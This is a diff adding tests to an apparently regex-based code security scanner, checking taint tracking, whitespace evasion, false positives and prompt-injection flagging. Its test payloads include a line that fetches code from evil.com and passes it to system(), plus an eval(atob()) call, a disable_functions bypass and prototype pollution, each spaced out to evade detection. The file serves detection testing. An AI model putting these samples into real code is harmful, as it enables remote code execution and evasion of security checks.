@@ -370,3 +370,127 @@ def test_minified_fallback_near_miss_threshold(lens):
     assert counts.get("high_risk_execution", 0) > 0, (
         "Fallback screen failed to engage at the 7.6% mass threshold!"
     )
+
+# ==============================================================================
+# TEST 9: ADVERSARIAL DATA FLOW & TAINT TRACKING (LHS FALSE EQUIVALENCY)
+# ==============================================================================
+
+def test_adversarial_lhs_comparison_trap(lens):
+    """
+    [ADVERSARIAL TRAP] Proves that the Left-Hand Side (LHS) variable extractor 
+    does not hallucinate on comparison operators (==, ===, !=, <=).
+    """
+    payload = """
+    // Trap 1: Strict equality comparison
+    if (status === 200) { console.log('OK'); }
+    
+    // Trap 2: Inequality comparison
+    if (user_input !== "admin") { die(); }
+    
+    // Trap 3: Less than or equal
+    if (retry_count <= 5) { retry(); }
+    
+    // Trap 4: String literal containing an assignment operator
+    const endpoint = "https://api.example.com/?auth=" + token;
+    
+    // Actual Taint: This is the ONLY one that should trigger the flow
+    let malicious_data = fetch('http://evil.com/payload');
+    system(malicious_data);  // <--- Changed to system() to guarantee a valid execution sink
+    """
+    
+    result = lens.scan_content(payload, loc=15)
+    counts = result["counts"]
+    snippets = str(result["snippets"])
+
+    assert counts.get("tainted_injection", 0) == 1, (
+        "LHS extractor failed to track the legitimate taint flow!"
+    )
+    assert "malicious_data" in snippets, "Failed to capture the correct tainted variable!"
+    assert "status" not in snippets, "LHS extractor hallucinated on '==='!"
+
+
+# ==============================================================================
+# TEST 10: REGEX EVASION & WHITESPACE MANIPULATION
+# ==============================================================================
+
+def test_evasion_whitespace_padding(lens):
+    """
+    [ADVERSARIAL TRAP] Attackers frequently use massive amounts of whitespace, 
+    tabs, and newlines between function calls and arguments to evade naive regex.
+    This proves the core structural signatures are immune to whitespace evasion.
+    """
+    payload = """
+    // Evasion 1: Spaced out safety bypass
+    ini_set   (   'disable_functions'   ,   0   ) ;
+    
+    // Evasion 2: Spaced out dynamic execution (matches obfuscation model)
+    eval  (   atob  (  payload  )  ) ;
+    
+    // Evasion 3: Bizarre spacing in prototype pollution
+    Object  .  __proto__   =   { admin : true } ;
+    """
+    
+    result = lens.scan_content(payload, loc=10)
+    counts = result["counts"]
+
+    assert counts.get("safety_bypasses", 0) > 0, "Whitespace evasion defeated safety bypass regex!"
+    assert counts.get("high_risk_execution", 0) > 0, "Whitespace evasion defeated RCE regex!"
+    assert counts.get("state_mutation", 0) > 0, "Whitespace evasion defeated prototype pollution regex!"
+
+
+# ==============================================================================
+# TEST 11: FALSE POSITIVE DEFENSE (STANDARD REGEX)
+# ==============================================================================
+
+def test_false_positive_substring_defense_standard(lens):
+    """
+    [PRECISION CHECK] Proves the standard regex extractors (not just the minified fallback)
+    use strict word boundaries (\b) and do not hallucinate threats inside safe variables 
+    or custom functions that happen to contain threat keywords.
+    """
+    payload = """
+    // Safe variations of 'eval'
+    function evaluate_math() { return true; }
+    let evaluation_score = 100;
+    const revalidation = false;
+    
+    // Safe variations of 'exec'
+    let execute_order_66 = false;
+    function my_executor() { pass; }
+    
+    // Safe variations of 'fetch'
+    function prefetch_data() { pass; }
+    let dog_fetch_toy = true;
+    """
+    
+    result = lens.scan_content(payload, loc=12)
+    counts = result["counts"]
+
+    assert counts.get("high_risk_execution", 0) == 0, "Standard regex hallucinated on 'eval/exec' substring!"
+    assert counts.get("io", 0) == 0, "Standard regex hallucinated on 'fetch' substring!"
+
+
+# ==============================================================================
+# TEST 12: AGENTIC RCE & PROMPT INJECTION ISOLATION
+# ==============================================================================
+
+def test_prompt_injection_without_execution(lens):
+    """
+    [PRECISION CHECK] Proves that if an I/O payload enters an LLM context, it triggers 
+    a Prompt Injection alert, but if it STOPS there and never reaches `eval()` or a DB, 
+    it DOES NOT trigger a tainted_injection or agentic_rce alert.
+    """
+    payload = """
+    let user_chat = requests.post("http://api.chat.com");
+    let ai_response = openai.chat.completions.create(user_chat);
+    
+    // The response is safely logged, not executed.
+    console.log(ai_response);
+    """
+    
+    result = lens.scan_content(payload, loc=6)
+    counts = result["counts"]
+
+    assert counts.get("prompt_injection", 0) > 0, "Failed to detect I/O flowing into LLM Hook!"
+    assert counts.get("agentic_rce", 0) == 0, "Hallucinated an Agentic RCE where no execution occurred!"
+    assert counts.get("tainted_injection", 0) == 0, "Hallucinated a standard RCE injection!"
